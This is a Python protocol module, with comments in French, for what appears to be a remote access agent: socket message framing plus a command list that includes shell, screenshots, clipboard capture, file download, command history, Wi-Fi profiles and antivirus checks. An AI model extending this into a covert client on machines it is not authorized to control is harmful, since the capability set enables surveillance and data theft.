"""
Protocole de communication JSON avec header 4 octets (big-endian).
Format: [4 bytes length][JSON payload]
"""
import json
import struct
import uuid
from datetime import datetime


class MsgType:
    AUTH = "auth"
    AUTH_OK = "auth_ok"
    AUTH_FAIL = "auth_fail"
    SYSINFO = "sysinfo"
    COMMAND = "command"
    RESPONSE = "response"
    HEARTBEAT = "heartbeat"
    DISCONNECT = "disconnect"


class Action:
    # Système
    SYSINFO = "sysinfo"
    PROCESSES = "processes"
    SERVICES = "services"
    USERS = "users"
    ENV_VARS = "env_vars"
    UPTIME = "uptime"
    DISK_USAGE = "disk_usage"
    INSTALLED_SW = "installed_sw"
    # Écran
    SCREENSHOT = "screenshot"
    CLIPBOARD = "clipboard"
    ACTIVE_WINDOW = "active_window"
    # Fichiers
    LISTDIR = "listdir"
    DOWNLOAD = "dl"
    FILE_SEARCH = "file_search"
    RECENT_FILES = "recent_files"
    FILE_HASH = "file_hash"
    READ_FILE = "read_file"
    # Réseau
    NETWORK_INFO = "network_info"
    OPEN_PORTS = "open_ports"
    CONNECTIONS = "connections"
    DNS_LOOKUP = "dns_lookup"
    PING_TARGET = "ping_target"
    ARP_TABLE = "arp_table"
    # Shell
    SHELL = "shell"
    CMD_HISTORY = "cmd_history"
    WHOAMI = "whoami"
    CWD = "cwd"
    CD = "cd"
    # Sécurité
    STARTUP_ITEMS = "startup_items"
    SCHEDULED_TASKS = "scheduled_tasks"
    WIFI_PROFILES = "wifi_profiles"
    FIREWALL = "firewall"
    ANTIVIRUS = "antivirus"
    EVENT_LOGS = "event_logs"
    PING = "ping"


def make_msg(msg_type: str, action: str = None, data: dict = None) -> dict:
    return {
        "id": str(uuid.uuid4()),
        "type": msg_type,
        "action": action,
        "data": data or {},
        "timestamp": datetime.utcnow().isoformat(),
    }


def send_msg(sock, msg: dict):
    payload = json.dumps(msg, ensure_ascii=False).encode("utf-8")
    header = struct.pack(">I", len(payload))
    sock.sendall(header + payload)


def recv_msg(sock) -> dict | None:
    raw_len = _recv_exact(sock, 4)
    if not raw_len:
        return None
    msg_len = struct.unpack(">I", raw_len)[0]
    if msg_len > 50 * 1024 * 1024:
        return None
    raw = _recv_exact(sock, msg_len)
    if not raw:
        return None
    return json.loads(raw.decode("utf-8"))


def _recv_exact(sock, n: int) -> bytes | None:
    data = b""
    while len(data) < n:
        try:
            chunk = sock.recv(n - len(data))
        except OSError:
            return None
        if not chunk:
            return None
        data += chunk
    return data
